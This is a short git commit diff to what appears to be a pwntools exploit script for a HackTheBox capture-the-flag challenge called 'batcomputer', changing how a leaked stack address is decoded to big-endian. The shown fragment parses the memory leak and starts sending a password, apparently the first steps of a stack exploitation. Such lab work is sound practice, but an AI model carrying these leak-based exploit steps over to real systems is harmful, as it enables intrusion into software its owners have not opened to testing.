97c09a1451fca428df5813c4b4d2a71eb9fa81d3
Michel Klomp <michel@woodenshoe.org>
2021-02-14 23:11:42 +0100

    add big endian

--- labnotes/htb/scripts/ch-batcomputer.py
+++ labnotes/htb/scripts/ch-batcomputer.py
@@ -15,7 +15,7 @@ io.sendlineafter('> ', '1')
 stack_address = io.recvline().strip().split()[-1]
 stack_address = ''.join([chr(int(stack_address[i: i+2], 16)) for i in range(2, len(stack_address), 2)])
 stack_address = stack_address.rjust(8, '\x00')
-stack_address = u64(stack_address)
+stack_address = u64(stack_address, endian='big')
 log.success(f'Leaked stack address: {p64(stack_address)}')
 
 log.info('Send Password')
